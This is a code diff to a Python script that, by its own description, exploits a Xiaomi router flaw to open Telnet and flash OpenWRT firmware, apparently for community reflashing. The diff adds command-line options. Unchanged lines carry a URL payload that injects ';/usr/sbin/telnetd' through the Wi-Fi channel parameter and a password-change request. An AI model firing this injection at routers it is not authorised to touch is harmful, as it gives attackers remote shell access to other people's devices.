@@ -7,6 +7,7 @@ Abuse vulnerability to get Telnet access. Replace firmware with custom OpenWRT.
 (c) 2016 Oleander Reis, Christoph Scheid, Tobias Weber
 """
 
+import argparse
 import logging  # TODO add everywhere.
 import os
 import re
@@ -15,6 +16,7 @@ import SocketServer
 import subprocess
 import sys
 import telnetlib
+import tempfile
 import threading
 import time
 import urlparse
@@ -26,16 +28,11 @@ import selenium.webdriver
 NotFound = selenium.common.exceptions.NoSuchElementException
 RETURN = selenium.webdriver.common.keys.Keys.RETURN
 
-ADDRESS = '192.168.31.1'  # Xiaomi default.
 ABUSE = ("http://{}/cgi-bin/luci/;stok={}/api/xqnetwork/"
     "set_wifi_ap?ssid=whatever&encryption=NONE&enctype=NONE&"
     "channel=1%3B%2Fusr%2Fsbin%2Ftelnetd")  # TODO urllib.quote_plus
 PASSWD = ("http://{}/cgi-bin/luci/;stok={}/api/xqsystem/"
     "set_name_password?oldPwd={}&newPwd={}")
-
-MANIFEST = ("https://firmware.marburg.freifunk.net/experimental/sysupgrade/"
-    "experimental.manifest")
-MODEL = 'xiaomi-miwifi-mini'
 
 def ping(address):
     return subprocess.call(['/usr/bin/ping', '-c1', address],  # Only 1 ping!
@@ -160,7 +157,7 @@ def enter_credentials(telnet, user, password):
     telnet.read_until("assword: ")  # Should be upper case P.
     telnet.write(password + "\n")
 
-def flash_via_telnet(address, user, password, path):
+def flash_via_telnet(address, user, password, path):  # TODO split to distinguish loaded/flashed
     """
     Return True or an error string.
     """
@@ -186,8 +183,31 @@ def flash_via_telnet(address, user, password, path):
     print t.read_all()
     t.close()
 
+def parser():
+    p = argparse.ArgumentParser()
+    p.add_argument('--address', default='192.168.31.1',  # Xiaomi default.
+        help='where to find the router')
+    p.add_argument('--password', default='password',  # TODO random.
+        help='used for WiFi, LuCI, Telnet')
+    p.add_argument('--manifest', default="https://firmware.marburg.freifunk.net/"
+        "experimental/sysupgrade/experimental.manifest",
+        help='where to find firmware')
+    p.add_argument('--model', default="xiaomi-miwifi-mini",
+        help='which firmware to use')
+    p.add_argument('--firmware',
+        help='path to the file (enables caching)')
+    p.add_argument('--force', action='store_true', default=False,
+        help="do not update the cache")
+    p.add_argument('--from', default='fresh',
+        help="current state of the roter (fresh, open, loaded)")
+    p.add_argument('--to', default='flashed',
+        help="desired state of the router (open, loaded, flashed)")
+    return p
+
 if __name__ == '__main__':
-    PASSWORD = 'password'
+    args = parser().parse_args()
+    print args  # TODO mkdtemp
+
     #driver = selenium.webdriver.Firefox()
     #driver.set_window_size(800, 600)
 
